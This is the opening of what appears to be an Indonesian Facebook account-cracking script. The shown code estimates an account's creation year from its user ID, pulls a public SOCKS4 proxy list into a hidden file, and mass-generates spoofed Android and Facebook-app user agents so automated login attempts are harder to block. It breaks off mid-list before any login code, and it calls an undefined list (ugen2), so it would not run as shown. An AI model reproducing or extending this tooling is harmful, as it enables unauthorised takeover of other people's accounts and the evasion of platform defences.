#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as panel
from rich.panel import Panel as nel
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.panel import Panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.tree import Tree
from rich import print as rprint
from rich import print as prints
from rich import pretty
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.text import Text as tekz
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#logika--tahun#
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
	
#sim_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
#sim_cp = f'CP-{hari}-{bulan}-{tahun}.txt'
#------------------[ USER-AGENT ]-------------------#
uman,usman1=[],[]
pretty.install()
CON=sol()
#ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
printcp=[]
oks=[]
cps=[]
redmi=[]
ugent=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mRAF-MKZ')
prox=open('.prox.txt','r').read().splitlines()
def rafmkz() :
	rc=random.choice
	rr=random.randrange
	samsung=rc(['SAMSUNG SM-G532G Build/MMB29T', 'SAMSUNG SM-G532M', 'SAMSUNG SM-G532M', 'SAMSUNG SM-G975F', 'SAMSUNG SM-A515F', 'SAMSUNG SM-A715F', 'SAMSUNG SM-G532G', 'SAMSUNG SM-J200G Build/LMY47X', 'SAMSUNG SM-G610M', 'SM-G532G Build/MMB29T', 'SAMSUNG SM-G610F', 'SAMSUNG SM-G610F', 'SAMSUNG SM-G570M', 'SAMSUNG SM-G532MT', 'SAMSUNG SM-A205G', 'SAMSUNG SM-J700M', 'SAMSUNG SM-N950F', 'SAMSUNG SM-G935F', 'SAMSUNG SM-A217F', 'SAMSUNG SM-G965F', 'SAMSUNG SM-A105M', 'SAMSUNG SM-J500M', 'SAMSUNG SM-G950F', 'SAMSUNG SM-A505F', 'SAMSUNG SM-G532M Build/MMB29T', 'SAMSUNG SM-N975F', 'SAMSUNG SM-J701M', 'SAMSUNG SM-J710MN', 'SAMSUNG SM-N960F', 'SAMSUNG SM-A505F', 'SAMSUNG SM-G532F', 'SAMSUNG SM-A515F', 'SAMSUNG SM-A107M']) 
	uga=f'Dalvik/2.1.0 (Linux; U; Android {str(rr(1, 14))}; {samsung}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(10, 14))}.{str(rr(1, 10))} Chrome/{str(rr(30, 270))}.0.{str(rr(15, 7000))}.{str(rr(20, 275))} Mobile Safari/537.36'
	return uga
	
for i in range(1000):
      rr = random.randint
      andro = f"{(rr(4,13))}"
      ua = f"Dalvik/2.1.0 (Linux; U; Android {andro}; V2043_21 Build/RP1A.200720.012) [FBAN/MessengerLite;FBAV/{(rr(100,467))}.0.0.5.119;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{(rr(100000000,9000000000))};FBCR/Warid;FBMF/vivo;FBBD/vivo;FBDV/V2043_21;FBSV/{andro};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"
      uc = f"Dalvik/2.1.0 (Linux; U; Android {andro}; moto g52 Build/S1SRS32.38-132-8) [FBAN/MessengerLite;FBAV/{(rr(100,467))}.0.0.7.131;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/543901789;FBCR/;FBMF/motorola;FBBD/motorola;FBDV/moto g52;FBSV/{andro};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1024,width=2048};]"
      ud = f"Dalvik/2.1.0 (Linux; U; Android {andro}; SM-J330FN Build/PPR1.180610.011) [FBAN/MessengerLite;FBAV/{(rr(100,467))}.0.0.3.109;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{(rr(100000000,9000000000))};FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBDV/SM-J330FN;FBSV/{andro};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"
      ua = random.choice([ua, uc, ud,])
      ugent.append(ua)
      
for i in range(1000):
	rr = random.randint
	andro = f"{(rr(4,13))}"
	memek = f"Dalvik/2.1.0 (Linux; U; Android {andro}; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/{(rr(100,467))}.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/{(rr(100000000,9000000000))};FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{andro};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=1920"
	momok = random.choice([memek])
	ugent.append(momok)
	
for xd in range(1000):
	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Redmi 4A Build/N2G47H)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)

#@@@@@@-UA NYA UBAH AJA KALO GA ENAK-@@@@@#
for t in range(10000):
	a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
	udin=random.choice(['R111-','R108-','R110-','R109-'])
	susu=random.choice(['Samsung Chromebook Plus (V2)'])
	dn=random.randrange(50,100)
	b=random.randrange(111111,210000)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	udinsad1=f'Mozilla/5.0 (Linux; Android {a}; SM-G531H Build/RKQ1.{b}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad2=f'Mozilla/5.0 (Linux; Android {a}; SM-J610G Build/PPR1.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 HeyTapBrowser/40.8.8.9'
	udinsad3=f'Mozilla/5.0 (Linux; Android {a}; SM-A405FN Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad4=f'Mozilla/5.0 (Linux; Android {a}; SM-X11O Build/SP1A.{b}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad5=f'Mozilla/5.0 (Linux; U; Android {a}; Mi A3 Build/QKQ1.{b}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/52.0.2254.54030'
	udinsad6=f'Mozilla/5.0 (Linux; Android {a}; GLi Lite Build/PPR1.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad7=f'Mozilla/5.0 (Linux; Android {a}; {susu} Build/{udin}15329.{dn}.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Safari/537.36'
	udinsad8=f'Mozilla/5.0 (Linux; U; Android {a}; V2029 Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/52.2.2254.54723'
	udinsad9=f'Mozilla/5.0 (Linux; U; Android {a}; Mi A2 Build/QKQ1.{b}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/52.0.2254.54030'
	udinsad10=f'Mozilla/5.0 (Linux; U; Android {a}; RMX2020 Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/51.0.2254.150807'
	udinsad11=f'Mozilla/5.0 (Linux; Android {a}; RMX2001 Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad12=f'Mozilla/5.0 (Linux; Android {a}; RMX1941 Build/PPR1.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/280.0.0.48.122;]'
	udinsad13=f'Mozilla/5.0 (Linux; Android {a}; RMX1825 Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad14=f'Mozilla/5.0 (Linux; U; Android {a}; SM-A505F Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/52.2.2254.54723'
	udinsad15=f'Mozilla/5.0 (Linux; U; Android {a}; SM-A205F Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/52.2.2254.54723'
	udinsad16=f'Mozilla/5.0 (Linux; Android {a}; SM-M136B Build/SP1A.{b}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad17=f'Mozilla/5.0 (Linux; Android {a}; SM-M317F Build/SP1A.{b}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad18=f'Mozilla/5.0 (Linux; Android {a}; SM-M326B Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad19=f'Mozilla/5.0 (Linux; Android {a}; SM-N986U Build/TP1A.{b}.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad20=f'Mozilla/5.0 (Linux; Android {a}; SM-N986B Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	uaku2 = random.choice([udinsad1,udinsad2,udinsad3,udinsad4,udinsad5,udinsad6,udinsad7,udinsad8,udinsad9,udinsad10,udinsad11,udinsad12,udinsad13,udinsad14,udinsad15,udinsad16,udinsad17,udinsad18,udinsad19,udinsad20])
	ugen.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPH1837)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
    
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Oppo A4 Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 10'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Mi 9T Pro Build/QKQ1.190825.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH1931 Build/QKQ1.200209.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; U; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ru-ru; Redmi 4A Build/N2G47H)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SM-N920)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (X11'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Linux x86_64)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Samsung Galaxy Note 9 Build/SM-N960N)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1. 15 (KHTML, like Gecko) Version/5.2 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/604.1.'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['M2012K11AG Build/L120G)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)86.0.4529.132 Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['MITO A75)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/11.4.8.1012 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG SM-F900U Build/PPR1.180610.011'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)#ffffff
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; U; Android;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; Redmi 5 Plus Build/OPM1.171019.019'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/13.4.0.1306 Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi Note 9 Pro)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ASUS_Z01QD)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi 4A Build/MMB29M; wv)'])
